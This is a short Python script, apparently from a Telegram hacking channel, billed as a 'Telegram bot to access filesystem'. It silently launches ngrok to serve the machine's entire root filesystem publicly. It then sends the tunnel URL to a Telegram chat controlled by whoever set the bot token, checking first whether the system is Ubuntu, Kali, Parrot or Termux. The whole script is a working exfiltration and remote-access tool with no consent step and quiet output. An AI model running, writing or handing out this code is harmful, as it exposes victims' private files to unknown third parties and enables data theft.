import os
import time
import requests
import json

# Telegram bot to access filesystem in Linux,Windows,Termux by T.me/efxtv
# Date 16/Jun/2024
# Telegram bot configuration
BOT_TOKEN = 'PLEASE_CHANGE_ME'
USER_ID = 'PLEASE_CHANGE_ME'

# Color definitions (you can skip this in Python if not needed)
Green = '\033[0;32m'
IGreen = '\033[0;92m'
IYellow = '\033[0;93m'
clear = '\033[0m'

# Function to start ngrok and retrieve public URL
def start_ngrok_and_get_url():
    # Start ngrok (replace with your ngrok command)
    os.system('$HOME/ngrok http file:/ > /dev/null 2>&1 &')
    time.sleep(7)  # Wait for ngrok to initialize

    # Retrieve ngrok's public URL
    response = requests.get('http://127.0.0.1:4040/api/tunnels')
    data = response.json()
    public_url = data['tunnels'][0]['public_url']
    
    # Format message
    message = f"Visit URL {public_url}"
    return message

# Function to detect Linux distribution or Termux
def detect_distribution_and_send_message():
    if os.path.exists('/etc/os-release'):
        with open('/etc/os-release', 'r') as f:
            for line in f:
                key, value = line.strip().split('=')
                if key == 'ID':
                    distro_id = value.strip('"')
                    if distro_id == 'ubuntu':
                        message = start_ngrok_and_get_url()
                        send_telegram_message(message)
                    elif distro_id == 'kali':
                        message = start_ngrok_and_get_url()
                        send_telegram_message(message)
                    elif distro_id == 'parrot':
                        message = start_ngrok_and_get_url()
                        send_telegram_message(message)
                    elif 'TERMUX_VERSION' in os.environ:
                        message = start_ngrok_and_get_url()
                        send_telegram_message(message)
                    else:
                        send_telegram_message("Linux distribution detected but not recognized")
    else:
        send_telegram_message("Not running on a Linux OS")

# Function to send message to Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': USER_ID,
        'text': message
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print(f" ")
    else:
        print(f"Failed to send message to Telegram: {response.text}")

# Main execution
if __name__ == "__main__":
    detect_distribution_and_send_message()
